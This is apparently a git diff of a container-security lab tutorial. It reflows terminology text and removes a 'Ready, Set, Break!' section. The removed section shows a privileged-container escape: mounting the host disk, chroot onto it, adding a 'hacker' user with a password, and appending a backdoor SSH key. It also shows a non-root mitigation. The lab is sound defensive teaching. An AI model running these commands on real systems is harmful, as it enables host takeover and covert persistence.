@@ -29,8 +29,6 @@ maxdepth: 1
 1. [Perform container image signing](image-signing)
 1. [Create SBOMs](making-a-software-bill-of-materials)
 1. [Vulnerability scan the images](vulnerability-scanning-images)
-1. [Dig into the container image manifests, layers, and configurations](container-image-components)
-1. [Break out of a misconfigured container](ready-set-break)
 
 ## Getting started
 
@@ -57,17 +55,15 @@ You're now ready to get started on the lab!
 
 ## Terminology
 
-- **Image**: An image is a bundle of configuration, metadata, and files in a structured format. When you want to run a
-  container, you take an image and "instantiate" (run) it.
-- **Container**: A container is lightweight bundle of software that includes everything needed to run an application.
-  When you run `docker run nginx`, you are taking the image `nginx` and creating a running container from it. When that
-  happens, a process or set of processes are started, and a filesystem is setup. Ultimately, containers are just processes
-  running on your host with a set of restrictions.
-- **OCI Artifact**: In the container ecosystem, there is a standard called the _Open Container Initiative_ or OCI. It
-  describes various specifications regarding [images](https://github.com/opencontainers/image-spec),
-  [runtimes](https://github.com/opencontainers/runtime-spec), and [distributing
-  images](https://github.com/opencontainers/distribution-spec). You don't need to worry about the details for this lab,
-  just know that an OCI Artifact is a bundle of files that conforms to the OCI standards.
+- **Image**: An image is a bundle of configuration, metadata, and files in a structured format. When you want to run a container, you take an image and
+  "instantiate" (run) it.
+- **Container**: A container is lightweight bundle of software that includes everything needed to run an application. When you run `docker run nginx`, you are
+  taking the image `nginx` and creating a running container from it. When that happens, a process or set of processes are started, and a filesystem is setup.
+  Ultimately, containers are just processes running on your host with a set of restrictions.
+- **OCI Artifact**: In the container ecosystem, there is a standard called the _Open Container Initiative_ or OCI. It describes various specifications regarding
+  [images](https://github.com/opencontainers/image-spec), [runtimes](https://github.com/opencontainers/runtime-spec), and [distributing
+  images](https://github.com/opencontainers/distribution-spec). You don't need to worry about the details for this lab, just know that an OCI Artifact is a
+  bundle of files that conforms to the OCI standards.
 - **Container Runtime**: Container runtimes are software components that facilitate running containers on a host operating system. In this lab we're going to
   use `docker` as our container runtime; while there are alternatives, this is the most widely adopted containerization software and simplest place to start.
 
@@ -776,146 +772,6 @@ $ docker run cgr.dev/chainguard/cosign tree cgr.dev/chainguard/nginx
 
 Not bad! In addition to a signature and SBOM, there are 4 other attestations available for this image that we could use
 to evaluate and make policy decisions about whether or not we're comfortable using it in our environment.
-
-## Ready, Set, Break!
-
-Alright, now it's time for our last section, a container escape.
-
-We'll start by running a standard Ubuntu container with some additional privileges which are sometimes used when trying
-to troubleshoot permissions issues:
-
-```{code-block} console
----
-class: skip-tests
----
-$ docker run -it -e HOME --privileged ubuntu:20.04
-Unable to find image 'ubuntu:20.04' locally
-20.04: Pulling from library/ubuntu
-ca1778b69356: Pull complete
-Digest: sha256:db8bf6f4fb351aa7a26e27ba2686cf35a6a409f65603e59d4c203e58387dc6b3
-Status: Downloaded newer image for ubuntu:20.04
-```
-
-Then, by abusing the additional access from the `--privileged` argument, we can mount the host filesystem, which in my
-example is on `/dev/nvme0n1p1`:
-
-```{code-block} console
----
-class: skip-tests
-emphasize-lines: 5-7
----
-$ mount | grep '/dev/'
-devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
-mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
-shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
-/dev/nvme0n1p1 on /etc/resolv.conf type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
-/dev/nvme0n1p1 on /etc/hostname type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
-/dev/nvme0n1p1 on /etc/hosts type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
-devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
-$ ls -al /home # Nothing in the home directory in the container
-total 8
-drwxr-xr-x 2 root root 4096 Apr 15  2020 .
-drwxr-xr-x 1 root root 4096 Apr 26 02:40 ..
-$ mount /dev/nvme0n1p1 /mnt
-$ chroot /mnt
-```
-
-Now that we've `chroot`ed into that filesystem, we are effectively on the host computer. Let's see see if we can find
-anything juicy, and maybe drop a quick backdoor for ourselves later:
-
-```{code-block} console
----
-emphasize-lines: 1
-class: skip-tests
----
-$ ls -al /home # We can now see /home/ on the host filesystem
-total 4
-drwxr-xr-x  3 root     root       22 Nov 15 17:28 .
-dr-xr-xr-x 18 root     root      257 Nov 15 17:28 ..
-drwx------ 14 ec2-user ec2-user 4096 Nov 26 14:54 ec2-user
-$ useradd hacker
-$ echo 'hacker:newpassword' | chpasswd
-```
-
-Finally, let's drop our public key into the current user's `~/.ssh/authorized_keys` file so there's another way back in.
-
-```{code-block} bash
----
-class: skip-tests
----
-echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> ${HOME}/.ssh/authorized_keys
-exit
-exit
-```
-
-Back on the host, we can see evidence of the break-in:
-
-```{code-block} console
----
-class: skip-tests
----
-$ tail -3 /etc/passwd
-apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
-nginx:x:995:993:Nginx web server:/var/lib/nginx:/sbin/nologin
-hacker:x:1001:1001::/home/hacker:/bin/bash
-$ tail -1 "${HOME}/.ssh/authorized_keys"
-ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor
-```
-
-### Fix
-
-How do we prevent these sort of issues? Specific to this breakout, even if we continue to allow `--privileged`, we can
-mitigate some of the impact by requiring that non-root users be used at runtime. For instance:
-
-```{code-block} bash
----
-class: skip-tests
----
-docker run -it -u 1001 --privileged ubuntu:20.04
-```
-
-Now when we go to mount the host filesystem or run `chroot`, we get an error:
-
-```{code-block} console
----
-emphasize-lines: 14
-class: skip-tests
----
-$ mount | grep '/dev/'
-devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
-mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
-shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
-/dev/nvme0n1p1 on /etc/resolv.conf type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
-/dev/nvme0n1p1 on /etc/hostname type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
-/dev/nvme0n1p1 on /etc/hosts type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
-devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
-$ ls -al /home
-total 8
-drwxr-xr-x 2 root root 4096 Apr 15  2020 .
-drwxr-xr-x 1 root root 4096 Apr 26 02:56 ..
-$ mount /dev/nvme0n1p1 /mnt
-mount: only root can do that
-$ chroot /mnt
-chroot: cannot change root directory to '/mnt': Operation not permitted
-$ exit
-```
-
-Breakout averted! Great job 😊
-
-```{seealso}
----
-class: dropdown
----
-Interested in some more ways to escape a container? Check out Panoptica's "[7 Ways to Escape a
-Container](https://www.panoptica.app/research/7-ways-to-escape-a-container)" blog post, which covers:
-  1. Mounting the host filesystem
-  1. Using a mounted docker socket
-  1. Project Injection
-  1. Adding a malicious kernel module
-  1. Reading secrets from the host
-  1. Overriding files on the host
-  1. Abusing notify on release
-```
 
 ## Conclusion
 
